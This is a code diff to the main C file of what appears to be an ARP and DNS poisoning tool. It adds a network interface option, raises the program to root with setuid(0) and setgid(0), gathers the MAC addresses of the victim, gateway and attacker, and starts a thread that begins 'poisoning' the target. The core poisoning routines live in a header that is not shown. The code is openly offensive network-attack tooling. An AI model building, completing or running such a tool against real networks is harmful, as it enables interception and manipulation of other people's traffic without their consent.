@@ -1,16 +1,21 @@
 #include <getopt.h>
+#include <pthread.h>
 #include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
 
 #include "addr.h"
+#include "poison.h"
 
 static void print_help() {
     puts("==>target<==\n"
          "\t[p]snip - the host of the target to poison\n"
          "\t[g]ateip - the IP of the gateway, will default to local routing lookup\n"
          "\n==>injection<==\n"
+         "\t[i]nterface - the interface to use\n"
          "\t[d]stip - the host of the crafted dns query, will default to local IP\n"
          "one or the other is needed but not both\n"
          "\n==>misc<==\n"
@@ -18,6 +23,15 @@ static void print_help() {
 }
 
 int main(int argc, char **argv) {
+    if (setuid(0)) {
+        perror("setuid");
+        exit(EXIT_FAILURE);
+    }
+    if (setgid(0)) {
+        perror("setgid");
+        exit(EXIT_FAILURE);
+    }
+
     int choice;
     int option_index = 0;
 
@@ -25,6 +39,7 @@ int main(int argc, char **argv) {
     char *gateip = NULL;
     char *host   = NULL;
     char *psnip  = NULL;
+    char *iface  = NULL;
 
     if (argc == 1) {
         print_help();
@@ -32,11 +47,12 @@ int main(int argc, char **argv) {
     }
 
     while (1) {
-        static struct option long_options[] = {{"psnip", required_argument, 0, 'p'},
-            {"gateip", required_argument, 0, 'g'}, {"dstip", required_argument, 0, 'd'},
-            {"hostip", required_argument, 0, 'o'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
+        static struct option long_options[]
+            = {{"psnip", required_argument, 0, 'p'}, {"interface", required_argument, 0, 'i'},
+                {"gateip", required_argument, 0, 'g'}, {"dstip", required_argument, 0, 'd'},
+                {"hostip", required_argument, 0, 'o'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
 
-        choice = getopt_long(argc, argv, "p:d:g:o:h", long_options, &option_index);
+        choice = getopt_long(argc, argv, "i:p:d:g:o:h", long_options, &option_index);
 
         if (choice == -1) {
             break;
@@ -46,6 +62,9 @@ int main(int argc, char **argv) {
             case 'h':
                 print_help();
                 return EXIT_SUCCESS;
+            case 'i':
+                iface = optarg;
+                break;
             case 'g':
                 gateip = optarg;
                 break;
@@ -74,6 +93,11 @@ int main(int argc, char **argv) {
         return EXIT_FAILURE;
     }
 
+    if (!iface) {
+        fputs("please specify an interface\n", stderr);
+        return EXIT_FAILURE;
+    }
+
     uint32_t pip, uip, dip, gip;
     uint8_t umac[6], pmac[6], gmac[6];
 
@@ -99,7 +123,7 @@ int main(int argc, char **argv) {
         }
     }
 
-    if (resolve_local_mac(umac)) {
+    if (resolve_local_mac(iface, umac)) {
         fputs("unable to resolve local MAC\n", stderr);
         return EXIT_FAILURE;
     }
@@ -134,5 +158,20 @@ int main(int argc, char **argv) {
     print_ip(gip);
     print_mac(gmac);
 
+    puts("==-starting poison-==");
+    targets_t tg;
+    tg.sock = peep_sock(iface);
+    tg.gip  = gip;
+    tg.cip  = pip;
+    memcpy(tg.omac, umac, 6);
+    memcpy(tg.cmac, pmac, 6);
+    memcpy(tg.gmac, gmac, 6);
+
+    pthread_t td;
+
+    pthread_create(&td, NULL, zerg_arp, &tg);
+
+    void *ret = NULL;
+    pthread_join(td, &ret);
     return EXIT_SUCCESS;
 }
